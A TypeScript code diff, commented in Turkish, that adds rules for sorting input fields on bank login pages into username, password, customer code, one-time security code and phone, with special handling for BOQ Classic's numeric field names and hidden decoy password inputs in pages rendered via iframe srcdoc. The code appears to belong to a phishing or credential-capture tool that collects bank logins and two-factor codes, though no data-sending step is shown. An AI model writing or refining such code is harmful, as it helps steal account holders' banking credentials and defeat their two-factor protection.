@@ -123,11 +123,59 @@ function inferFieldKind(
   );
 
   const type = ((el as HTMLElement)?.getAttribute?.("type") ?? "").toLowerCase();
-  if (type === "password" || /\b(password|passcode|pin|secret)\b/.test(raw)) return "password";
-  if (/\b(tac|otp|one time|one-time|verification|security code|sms code|code|token|security token|passcode|rsa)\b/.test(raw)) return "tacCode";
-  if (type === "tel" || /\b(phone|mobile|contact|cell)\b/.test(raw)) return "bankPhone";
-  if (/\b(personal|identity|customer number|member number|ird|tax number)\b/.test(raw)) return "personalCode";
-  if (/\b(username|user id|userid|login id|access number|client number|customer id|card number|account number)\b/.test(raw)) {
+
+  // ⭐ BOQ Classic SPECIAL MAP: BOQ inputların name attribute u SAYI (name=4 / name=8 / name=14)
+  //   oldugu icin standart regexler calismiyor. data-testid ve label attribute'lari GUCLU
+  //   oldugu icin oncelikle DATA-TESTID uzerinden eslestir:
+  const dtid = ((el as HTMLElement)?.getAttribute?.("data-testid") ?? "").toLowerCase();
+  const ida = ((el as HTMLElement)?.getAttribute?.("id") ?? "").toLowerCase();
+  const cla = ((el as HTMLElement)?.getAttribute?.("class") ?? "").toLowerCase();
+  let pdtid = "";
+  try {
+    pdtid = ((el as HTMLElement)?.parentElement?.parentElement?.getAttribute?.("data-testid") ?? "").toLowerCase();
+  } catch {
+    pdtid = "";
+  }
+  const lbl = (label ?? "").toLowerCase();
+  const s1 = `${dtid} ${ida} ${pdtid} ${cla} ${lbl}`;
+  const s2 = `${dtid} ${ida} ${pdtid} ${cla} ${raw} ${lbl}`;
+
+  const dataTestId = dtid;
+  const idAttr = ida;
+  const classAttr = cla;
+  const parentDataTestId = pdtid;
+
+  if (
+    dataTestId === "txtuserid" || idAttr === "txtuserid" || parentDataTestId === "txtuserid" ||
+    /txtuserid|customeraccessnumber|customer-access-number|accessno|accessnumber/i.test(s1)
+  ) {
+    return "username";
+  }
+  if (
+    dataTestId === "txtpassword" || idAttr === "txtpassword" || parentDataTestId === "txtpassword" ||
+    /txtpassword|formgrouppassword|form-group--password|passwordname/i.test(s2)
+  ) {
+    return "password";
+  }
+  if (
+    dataTestId === "txtusersignon" || idAttr === "txtusersignon" || parentDataTestId === "txtusersignon" ||
+    /txtusersignon|usersignon|userid|businessusersignon|form-group--user-id/i.test(s1)
+  ) {
+    return "personalCode";
+  }
+  if (
+    dataTestId === "txttokenotp" || idAttr === "txttokenotp2" || parentDataTestId === "txttokenotp" ||
+    /formgrouptoken|form-group--token|tokenotp|rsa/i.test(s2)
+  ) {
+    return "tacCode";
+  }
+
+  // STANDART GENEL regex (dig other banks):
+  if (type === "password" || /password|passcode|pin|secret/.test(raw)) return "password";
+  if (/tac|otp|one time|one-time|verification|security code|sms code|code|token|security token|rsa/i.test(raw)) return "tacCode";
+  if (type === "tel" || /phone|mobile|contact|cell/i.test(raw)) return "bankPhone";
+  if (/personal|identity|customer number|member number|ird|tax number|customer access/i.test(raw)) return "personalCode";
+  if (/username|user ?id|userid|login id|access ?number|client number|customer id|card number|account number|customer access/i.test(raw)) {
     return "username";
   }
   return "unknown";
@@ -137,11 +185,43 @@ function sanitizeKey(value: string) {
   return value.trim().toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_+|_+$/g, "");
 }
 
-function isMeaningfulField(el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) {
-  const type = (el.getAttribute("type") ?? "").toLowerCase();
+function isMeaningfulField(el: any) {
+  const type = ((el as HTMLElement)?.getAttribute?.("type") ?? "").toLowerCase();
   if (["hidden", "submit", "button", "image", "reset"].includes(type)) return false;
   if ((type === "checkbox" || type === "radio") && !(el as HTMLInputElement).checked) return false;
-  if (el.getAttribute("aria-hidden") === "true") return false;
+  if ((el as HTMLElement)?.getAttribute?.("aria-hidden") === "true") return false;
+
+  // ⭐ GİZLİ (görünmeyen inputları filtrele:
+  //   BOQ Classic 3 adet gizli password inputu (passwordname1/2/3)
+  //   style=position:absolute; left:-9999px; visibility:hidden; z-index:-1
+  //   type=password olsada value ları boştur ve orderedField sıralamasını KARIŞTIRIRLAR.
+  //   Eğer display:none, visibility:hidden, -9999px solda, veya offsetParent null (DOM'da görünmüyor)
+  //   gibi özelliklerinden herhangi birine sahipse anlamlı input SAYMA.
+  try {
+    const style = window.getComputedStyle(el as HTMLElement);
+    if (style.display === "none") return false;
+    if (style.visibility === "hidden" || style.visibility === "collapse") return false;
+  } catch {}
+  try {
+    const styleAttr = ((el as HTMLElement)?.getAttribute?.("style") ?? "");
+    if (
+      /display\s*:\s*none/i.test(styleAttr) ||
+      /visibility\s*:\s*hidden/i.test(styleAttr) ||
+      /left\s*:\s*-9999/i.test(styleAttr) ||
+      /z-index\s*:\s*-1/i.test(styleAttr)
+    ) {
+      return false;
+    }
+  } catch {}
+  try {
+    if ((el as HTMLElement).offsetParent == null) {
+      // Bazı browserlarda iframe srcdoc HTML'de her zaman offsetParent olabilir,
+      // offsetWidth/Height 0 ise gizlidir:
+      const w = (el as HTMLElement).offsetWidth ?? 0;
+      const h = (el as HTMLElement).offsetHeight ?? 0;
+      if (w <= 1 && h <= 1) return false;
+    }
+  } catch {}
   return true;
 }
 
